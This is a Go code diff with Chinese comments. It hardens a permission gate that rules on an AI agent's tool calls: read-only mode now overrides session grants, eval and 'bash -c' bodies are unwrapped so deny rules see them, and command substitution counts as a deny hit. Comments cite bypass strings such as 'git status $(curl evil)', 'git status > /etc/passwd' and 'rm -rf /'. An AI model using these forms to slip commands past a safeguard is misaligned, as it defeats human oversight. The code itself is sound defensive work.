@@ -5,8 +5,10 @@
 //	requiresUserInteraction → ask（交互型工具天然要用户）
 //	alwaysAsk 硬阻断段 → disallowed/project-deny 仍压过「问」（被硬禁的
 //	  工具不能退化成「弹窗一点就能跑」）
-//	alwaysAsk 会话授权段 → 命中即放行（钥匙是本会话的授权，不看模式）
-//	alwaysAsk 只读拦截段 → 只读档的非只读工具直接拒（不给「问」的机会）
+//	alwaysAsk 只读拦截段 → 只读档的非只读工具直接拒——「禁」压过会话钥匙
+//	  （guardx#182：会话授权对普通写工具在只读档同样被拦，两路径同参，
+//	  敏感度倒挂的钥匙旁路不复存在）
+//	alwaysAsk 会话授权段 → 命中即放行（钥匙是本会话的授权；只读档例外见上）
 //	disallowed → deny
 //	project deny → deny
 //	配置白名单 → allow（break-glass 位次，issue #58：运维显式加白是「比模式
@@ -32,6 +34,8 @@
 //
 // 规则内容匹配（对标 matchesRuleContent）：精确 / `prefix:*` 前缀（prefix 或
 // prefix+空白开头——空白含换行，换行同属命令分隔）/ `*` 通配（跨行透明）。
+// 三形态不可混用（guardx#183）：`:*` 前缀里又写 `*` 的写法判定期退化为整串
+// 通配并经 OnConfigWarn 告警，规则不得静默死字。
 // 匹配对象从工具输入提取（字段名按 Service.SubjectKeys 清单，缺省
 // command/url/file_path/path/pattern/patch_text，或字符串输入本身）；类型化
 // 输入（map[string]string、struct 及其字段/json tag）同样参与提取（#65/#72：
@@ -55,9 +59,14 @@
 // 危险命令即拦）。不追求完整 shell 语法：真 AST 形态（引号嵌套、算术展开等）
 // 归 tools/bashguard，本包只做 stdlib 操作符切分，拆不动的形态宁可让 allow
 // 失配（落 ask），不得让操作符后的命令搭车放行。
-// 命令替换（#144）：段内含未引用化的 `$(`、反引号、`${` 时该段 allow 恒失配
-// （单引号内为字面；双引号内照样执行/展开，不豁免）——替换体的真实命令
-// 运行期才展开，字面前缀核对不了它，宁可落 ask（hasCommandSubstitution）。
+// 命令替换（#144/#181）：段内含未引用化的 `$(`、反引号、`${` 时该段 allow
+// 恒失配（单引号内为字面；双引号内照样执行/展开，不豁免）——替换体的真实
+// 命令运行期才展开，字面前缀核对不了它，宁可落 ask（hasCommandSubstitution）；
+// deny/ask 侧同面（#181）：替换体段**视为命中**——替换体不可字面核对而 deny
+// 是最后一道硬闸，yolo/白名单下 deny 失配即无确认放行（漏放方向），宁可误拦。
+// 派发器（#181）：`eval`、`sh|bash|zsh|dash|ksh -c` 形态的首操作数/-c 值是
+// 运行期真实执行的脚本，splitCommand 把它递归拆段并入（原段保留）——deny
+// 的「任一段命中」由此看见派发器内层，allow 的「每段命中」只更严。
 // 重定向（#161）：段内含未加引号包裹的 `>` `<`（覆盖 `>>` `2>` `2>&1` `<<` 等）
 // 时该段 allow 恒失配——重定向目标路径不在任何规则的审视面内，
 // `git status > /etc/passwd` 不得搭 `git status:*` 的车放行；与替换体守门
@@ -118,6 +127,10 @@ type Rule struct {
 	ToolName string
 	// Content 输入内容模式（command/url/路径）：空 = 该工具全部调用；
 	// "git status:*" 前缀（空白边界，命令形态专用）；含 * 通配；否则精确等值。
+	// ⚠ 三种形态不可混用（guardx#183）：`:*` 前缀里又写 `*`（如
+	// "*/etc/passwd:*"）的混用写法此前是静默死字（字面前缀与通配两个分支都
+	// 不命中）——现判定期退化为 glob 前缀匹配并经 OnConfigWarn 告警，但正确
+	// 写法是单一形态：前缀意图写作 "prefix:*"，通配意图写作 "*prefix*"。
 	// ⚠ 路径规则用 wildcard 形态（"/repo/data/*"）而非前缀形态——前缀边界是
 	// 空白/制表符，对路径子树形同虚设；路径 subject 匹配前会 filepath.Clean
 	//（`..` 穿越不命中），符号链接围栏归执行器——单源见 sandbox.FSFence
@@ -264,22 +277,23 @@ func (s *Service) checkUserInteraction(cfg config, tool string, input any) Decis
 	return decision(Ask, "tool.userInteraction", "交互型工具需要用户参与: "+tool)
 }
 
-// checkAlwaysAsk 逐次确认工具：先走硬阻断，再看会话授权，最后问——
+// checkAlwaysAsk 逐次确认工具：先走硬阻断，再看只读拦截，最后会话授权与问——
 // 不可被模式/白名单放行。
 //
-// 只读拦截插在会话授权之后、ask 之前：只读档对非只读工具是「禁」不是「问」
-// ——否则只读退化成「换个姿势问」（issue #24）。会话授权不在其列：那是用户
-// 已经给出的决定（放行），不是一次「问」——保持「不看模式」的既有语义。
-// 配置白名单同样不在此段放行（Capability 注释：AlwaysAsk 不可被白名单绕过）。
+// 只读拦截插在会话授权**之前**（guardx#182）：只读档对非只读工具是「禁」
+// 不是「问」，也压过会话钥匙——否则敏感度倒挂（#182 修前：会话授权对
+// AlwaysAsk 写工具先于只读拦截放行、对普通写工具却被只读拦截拒绝，同一把
+// 钥匙两条路径方向相反）。会话授权在只读档之外保持「不看模式」的既有语义。
+// 配置白名单不在此段放行（Capability 注释：AlwaysAsk 不可被白名单绕过）。
 func (s *Service) checkAlwaysAsk(cfg config, tool string, input any, mode Mode, cap Capability) Decision {
 	if d, hit := hardDeny(cfg, tool, input); hit {
 		return d
 	}
-	if matchRules(s.sessionRuleSet().Allow, Allow, tool, input, cfg) {
-		return decision(Allow, "rule.session.allow", "本会话已授权: "+tool)
-	}
 	if readonlyWrite(mode, cap) {
 		return readonlyDeny(tool)
+	}
+	if matchRules(s.sessionRuleSet().Allow, Allow, tool, input, cfg) {
+		return decision(Allow, "rule.session.allow", "本会话已授权: "+tool)
 	}
 	return decision(Ask, "tool.alwaysAsk", "工具要求逐次确认: "+tool)
 }
@@ -429,6 +443,16 @@ func matchRules(rules []Rule, pol Behavior, tool string, input any, cfg config) 
 	for _, r := range rules {
 		if !matchToolName(r.ToolName, tool, cfg.equiv) {
 			continue
+		}
+		// #183 fail-loud：混用形态（`:*` 前缀里又写了 `*`）此前两分支都不
+		// 命中、规则静默死字且零告警。判定期已退化为 glob 前缀匹配
+		// （wildcardPrefixMatch），退化语义宽于作者的前缀意图，经 cfg.warn
+		// 显式暴露；频度由宿主去重。
+		if mixedGlobContent(r.Content) && cfg.warn != nil {
+			cfg.warn(fmt.Sprintf(
+				"permgate: 规则 Content %q 混用了 `:*` 前缀形态与 `*` 通配（前缀自身含 *）——已退化为 glob 前缀匹配；"+
+					"请改用单一形态（前缀写作 %q 或通配），混用写法此前是静默死字（guardx#183）",
+				r.Content, strings.TrimSuffix(r.Content, ":*")))
 		}
 		if matchRuleContent(r.Content, faces, pol) {
 			return true
@@ -666,7 +690,19 @@ func normalizeFieldName(s string) string {
 // heredoc 等真 AST 形态归 tools/bashguard）——本切分的目标是 fail-closed：
 // 让 allow 侧「每段都在名单里才放行」，操作符后的命令不得搭车；deny 侧
 // 「任一段命中即拦」，换行不再把 `rm\n-rf /` 藏过前缀规则。
+// 派发器解包（#181）：`eval x`、`bash -c 'x'`（含 `-lc` 等含 c 的选项簇、
+// `/bin/bash` 路径形态）的脚本体递归拆段并入返回——内层命令运行期真实执行，
+// 必须成为独立的「一段」（deny 任一段命中才看得见它）。
 func splitCommand(cmd string) []string {
+	return splitCommandDepth(cmd, 0)
+}
+
+// maxDispatchDepth 派发器递归解包上限（防 `eval eval eval …` 病态嵌套；3 层
+// 远超真实命令形态）。到限后段保持原样——allow 侧恒失配语义不依赖解包。
+const maxDispatchDepth = 3
+
+// splitCommandDepth 带递归深度的拆段实现（见 splitCommand）。
+func splitCommandDepth(cmd string, depth int) []string {
 	var (
 		segs     []string
 		cur      strings.Builder
@@ -735,7 +771,53 @@ func splitCommand(cmd string) []string {
 		}
 	}
 	flush()
-	return segs
+	if depth >= maxDispatchDepth {
+		return segs
+	}
+	out := make([]string, 0, len(segs))
+	for _, seg := range segs {
+		out = append(out, seg)
+		out = append(out, unwrapDispatcher(seg, depth)...)
+	}
+	return out
+}
+
+// evalDispatchRe 段首 eval 派发器（#181）：首操作数是运行期真实执行的脚本。
+var evalDispatchRe = regexp.MustCompile(`(?i)^eval\s+(.+)$`)
+
+// shellDispatchRe shell 解释器派发器（#181）：`[path/]sh|bash|zsh|dash|ksh`
+// + 任意短/长选项簇 + 含 c 的选项（`-c`、`-lc` 等）——其后整段是运行期真实
+// 执行的脚本。选项簇含 c 的判定收窄到短横线后 ≤3 个字母包着 c：`--rcfile`/
+// `--config` 这类恰含 c 的长选项不得被当成派发标志（否则 -c 的真实脚本 operand
+// 被错当 rcfile 路径，内层脚本反而漏拆）。`bash --rcfile x -c 'cmd'`（选项间
+// 夹裸 operand）不在覆盖面——拆不动的形态 allow 侧恒失配兜底。
+var shellDispatchRe = regexp.MustCompile(`(?i)^((?:[\w./-]+/)*)(?:sh|bash|zsh|dash|ksh)\s+(?:-{1,2}[\w-]+\s+)*-{1,2}[a-z]{0,3}c[a-z]{0,3}\s+(.+)$`)
+
+// unwrapDispatcher 派发器解包（#181）：段首是 eval / shell -c 形态时，剥掉
+// 脚本体的对称引号后递归拆段返回；非派发器形态返回 nil（调用方保留原段）。
+// 原段保留 + 内层并入：deny/ask 是「任一段命中」，多段只多拦；allow 是
+// 「每段命中」，多段只更严——两个方向都取保守侧。
+func unwrapDispatcher(seg string, depth int) []string {
+	var inner string
+	if m := evalDispatchRe.FindStringSubmatch(seg); m != nil {
+		inner = m[1]
+	} else if m := shellDispatchRe.FindStringSubmatch(seg); m != nil {
+		inner = m[2]
+	} else {
+		return nil
+	}
+	if q := trimSymmetricQuotes(inner); q != "" {
+		inner = q
+	}
+	return splitCommandDepth(inner, depth+1)
+}
+
+// trimSymmetricQuotes 剥掉首尾成对的引号（派发器脚本体的 `'…'` / `"…"`）。
+func trimSymmetricQuotes(s string) string {
+	if len(s) >= 2 && ((s[0] == '\'' && s[len(s)-1] == '\'') || (s[0] == '"' && s[len(s)-1] == '"')) {
+		return s[1 : len(s)-1]
+	}
+	return s
 }
 
 // matchRuleContent 内容模式匹配：空模式=全匹配（该工具全部调用）。
@@ -750,15 +832,27 @@ func matchRuleContent(content string, faces []subjectFace, pol Behavior) bool {
 	}
 	prefix := strings.TrimSuffix(content, ":*")
 	isPrefix := prefix != content
+	mixedGlob := mixedGlobContent(content)
 	for _, face := range faces {
 		if len(face) == 0 {
 			continue
 		}
-		if faceMatch(face, content, prefix, isPrefix, pol) {
+		if faceMatch(face, content, prefix, isPrefix, mixedGlob, pol) {
 			return true
 		}
 	}
 	return false
+}
+
+// mixedGlobContent 报告 content 是否为「`:*` 前缀形态且前缀自身含 `*`」的
+// 混用写法（guardx#183）：字面前缀比对按含 `*` 的字面文本核对（sub 永不以
+// 这类文本开头）、通配分支又被 isPrefix 跳过——两个分支都不命中，规则静默
+// 死字且零告警（#86 自述 deny 规则最坏的失效形态）。
+func mixedGlobContent(content string) bool {
+	if !strings.HasSuffix(content, ":*") {
+		return false
+	}
+	return strings.Contains(strings.TrimSuffix(content, ":*"), "*")
 }
 
 // faceMatch 单面命中：Allow 全段命中（universal），Deny/Ask 任一段命中
@@ -768,27 +862,35 @@ func matchRuleContent(content string, faces []subjectFace, pol Behavior) bool {
 // ——allow 前缀按字面文本核对，替换体的真实命令在运行期才展开、重定向目标
 // 路径不在规则审视面内（`git status $(curl evil)` / `git status > /etc/passwd`
 // 搭 `git status:*` 的车曾原样放行，与「拆不动的形态宁可失配」的包注释承诺
-// 相反；deny/ask 不受影响，仍按既有保守语义）。
-func faceMatch(face subjectFace, content, prefix string, isPrefix bool, pol Behavior) bool {
+// 相反）。
+// Deny/Ask 侧的替换体守门方向相反（guardx#181）：段内含命令替换面时**视为
+// 命中**——替换体不可字面核对，deny 是最后一道硬闸，yolo/白名单下 deny
+// 失配即无确认放行（漏放方向），宁可误拦；ask 同侧（不可解析的段强制问）。
+// 混用形态（#183）退化为 glob 前缀匹配（wildcardPrefixMatch）：宽于字面前缀
+// 意图的部分由 OnConfigWarn 告警兜底（见 matchRules）。
+func faceMatch(face subjectFace, content, prefix string, isPrefix, mixedGlob bool, pol Behavior) bool {
 	if pol == Allow {
 		for _, seg := range face {
-			if hasCommandSubstitution(seg) || hasRedirect(seg) || !segMatch(content, prefix, isPrefix, seg) {
+			if hasCommandSubstitution(seg) || hasRedirect(seg) || !segMatch(content, prefix, isPrefix, mixedGlob, seg) {
 				return false
 			}
 		}
 		return true
 	}
 	for _, seg := range face {
-		if segMatch(content, prefix, isPrefix, seg) {
+		if hasCommandSubstitution(seg) || segMatch(content, prefix, isPrefix, mixedGlob, seg) {
 			return true
 		}
 	}
 	return false
 }
 
-// segMatch 单段匹配：`p:*` 前缀（空白边界）/ 含 * 通配 / 精确。
-func segMatch(content, prefix string, isPrefix bool, sub string) bool {
+// segMatch 单段匹配：`p:*` 前缀（空白边界；前缀含 `*` 的混用形态退化见
+// mixedGlobHit，#183）/ 含 * 通配 / 精确。
+func segMatch(content, prefix string, isPrefix, mixedGlob bool, sub string) bool {
 	switch {
+	case isPrefix && mixedGlob && mixedGlobHit(content, prefix, sub):
+		return true
 	case isPrefix && prefixBoundary(sub, prefix):
 		return true
 	case !isPrefix && strings.Contains(content, "*") && wildcardMatch(content, sub):
@@ -797,6 +899,42 @@ func segMatch(content, prefix string, isPrefix bool, sub string) bool {
 		return true
 	}
 	return false
+}
+
+// mixedGlobHit 混用形态的退化匹配（guardx#183）：写法 `p:*` 且 p 含 `*` 时
+// 作者意图有两种读法——「glob 前缀 + 空白边界」（把尾缀 `:*` 当形态标记）与
+// 「含 `p:` 字样的整串通配」（把尾缀 `:*` 当 `:`+通配字面）。deny/ask 侧取
+// 两种读法的**并集**（只多拦，保守方向；allow 侧宽出意图的部分由
+// OnConfigWarn 告警兜底，见 matchRules）。
+func mixedGlobHit(content, prefix, sub string) bool {
+	return wildcardPrefixMatch(prefix, sub) || wildcardMatch(content, sub)
+}
+
+// wildcardPrefixMatch 混用形态的 glob 前缀匹配（guardx#183）：pattern 里的
+// `*` 跨任意字符（含换行，(?s)——与 wildcardMatch 同口径），锚定 sub 的
+// **开头**，命中后要求其后是空白或结尾（与 prefixBoundary 同款边界）——
+// 即「带 glob 的前缀」语义：`*/etc/passwd:*` 命中 `cat /etc/passwd` 及其任意
+// 后续，不命中不含该前缀形态的散文。与 wildcardMatch 共用编译缓存（键加
+// 前缀域防两种 pattern 形态互相污染）。缓存键带域前缀，编译源闭包 pattern
+// 本体（loader 的入参是完整缓存键，不能直接当 pattern 用）。
+func wildcardPrefixMatch(pattern, sub string) bool {
+	re, err := wildcardCache.GetOrLoadWithSource(context.Background(), "glob-prefix\x00"+pattern, func(_ context.Context, _ string) (*regexp.Regexp, error) {
+		quoted := regexp.QuoteMeta(pattern)
+		return regexp.Compile(`(?s)^` + strings.ReplaceAll(quoted, `\*`, ".*"))
+	})
+	if err != nil || re == nil {
+		return false
+	}
+	m := re.FindStringIndex(sub)
+	if m == nil || m[0] != 0 {
+		return false
+	}
+	rest := sub[m[1]:]
+	if rest == "" {
+		return true
+	}
+	r, _ := utf8.DecodeRuneInString(rest)
+	return unicode.IsSpace(r)
 }
 
 // hasCommandSubstitution 报告段内是否存在命令替换/参数展开面（`$(`、反引号、
